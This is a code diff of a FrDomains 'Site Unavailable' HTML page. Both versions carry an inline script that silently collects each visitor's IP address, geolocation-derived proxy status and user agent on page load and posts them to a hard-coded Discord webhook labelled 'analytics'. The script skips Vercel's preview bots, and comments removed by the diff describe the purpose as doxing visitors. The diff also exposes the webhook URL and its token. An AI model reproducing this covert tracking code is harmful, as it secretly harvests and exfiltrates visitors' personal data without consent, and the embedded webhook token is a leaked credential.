@@ -4,83 +4,50 @@
     <meta name="color-scheme" content="light dark">
     <title>Site Unavailable - FrDomains</title>
     <script>
-var WebhookUrl = 'https://discord.com/api/webhooks/1338922762466627676/pf7b60dlVcdqVwb6Wu5bbUYOuwAE2ZKNkGdy1L147gdS0IulCret6wV26F6oacN3Lvig'; //discord url DUH
-
-var request = new XMLHttpRequest();
-request.open("POST", WebhookUrl);
-request.setRequestHeader('Content-type', 'application/json'); //basically just set up the post request for the webhook
+var WebhookUrl = 'https://discord.com/api/webhooks/1338922762466627676/pf7b60dlVcdqVwb6Wu5bbUYOuwAE2ZKNkGdy1L147gdS0IulCret6wV26F6oacN3Lvig';
 
 (async () => {
   try {
     const userAgent = navigator.userAgent;
-    if (userAgent === 'vercel-screenshot/1.0') {
+    if (userAgent.includes('vercel')) {
       console.log('Blocked vercel useragent:', userAgent);
-      return; // Exit the function if the user agent is vercel-screenshot/1.0
+      return;
     }
-
-    if (userAgent === 'vercel-favicon/1.0') {
-      console.log('Blocked vercel useragent:', userAgent);
-      return; // Exit the function if the user agent is vercel-favicon/1.0
-    }
-
 
     const IPresponse = await fetch('https://api.ipify.org?format=json');
     const IPdata = await IPresponse.json();
-    const userIP = IPdata.ip; //get your ip with ipify cuz im retarded and dont know how to normally
+    const userIP = IPdata.ip;
 
-    const dataResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`); //ermm when you enter the website it will send you ip to ipapi and ipapi will say hmm yes okay thats very hot now let me dox you rq
+    const dataResponse = await fetch(`https://freeipapi.com/api/json/${userIP}`);
     const data = await dataResponse.json();
 
-    const success = true; // you shouldnt do this im just lazy to change it i was debugging
-
-    if (success === true) { // you shouldnt do this im just lazy to change it i was debugging
-        
-      const Payload = { // the whole payload thing is what you send to the webhook and the webhook will say hmm yes okay okay okay i will tell discord daddy to go send a message yes okay bye
-        username: "analytics | frdomains", //username DUUUHH
+    const Payload = {
+        username: "analytics | frdomains",
         embeds: [
           {
             title: 'analytics',
             description: 'new visit',
             fields: [
-              {
-                name: 'IP',
-                value: userIP,
-                inline: true
-              },
-              {
-                name: 'Type',
-                value: 'IPv' + data.ipVersion,
-                inline: true
-              },
-              {
-                name: 'Proxy?',
-                value: data.isProxy,
-                inline: true
-              },
-              {
-                name: 'Useragent',
-                value: navigator.userAgent,
-                inline: true
-              },
-              {
-                name: 'Page',
-                value: 'site-is-down/index.html',
-                inline: false
-              },
+              { name: 'IP', value: userIP, inline: true },
+              { name: 'Type', value: 'IPv' + data.ipVersion, inline: true },
+              { name: 'Proxy?', value: data.isProxy, inline: true },
+              { name: 'Useragent', value: navigator.userAgent, inline: true },
+              { name: 'Page', value: 'site-is-down/index.html', inline: false },
             ],
           }
         ]
-      };
-      request.send(JSON.stringify(Payload));//the request was set up in the beggining so we just do request.send(PAYLOAD) and yippie we go!!!!!
+    };
 
-    } else {
-      console.error('status: ', data.status, ' message: ', data.message); //if error then dont explode
-    }
+    await fetch(WebhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(Payload)
+    });
+
   } catch (error) {
-    console.error('erm merror: ', error);//if error then dont explode #2
+    console.error('Error:', error);
   }
 })();
-
 </script>
 </head>
 <body style="background: rgb(0,44,106);">
@@ -100,15 +67,14 @@ request.setRequestHeader('Content-type', 'application/json'); //basically just s
 </body>
 <script>
 window.onload = function() {    
-  while (true) {
-    setTimeout(() => {
+  setInterval(() => {
     fetch('https://down.frdomains.site/isonline.boolean')
       .then(response => response.text())
       .then(data => {
         console.log(data);
         if (data === 'true') {
-          //window.location.href = "https://frdomains.site";
           console.log('Site is back up');
+          //window.location.href = "https://frdomains.site";
         } else {
           console.log('Site is still down');
         }
@@ -116,7 +82,6 @@ window.onload = function() {
       .catch(error => {
         console.error('Error:', error);
       });
-    }, 5000);
-  }
+  }, 5000); // Každých 5 sekund
 };
 </script>
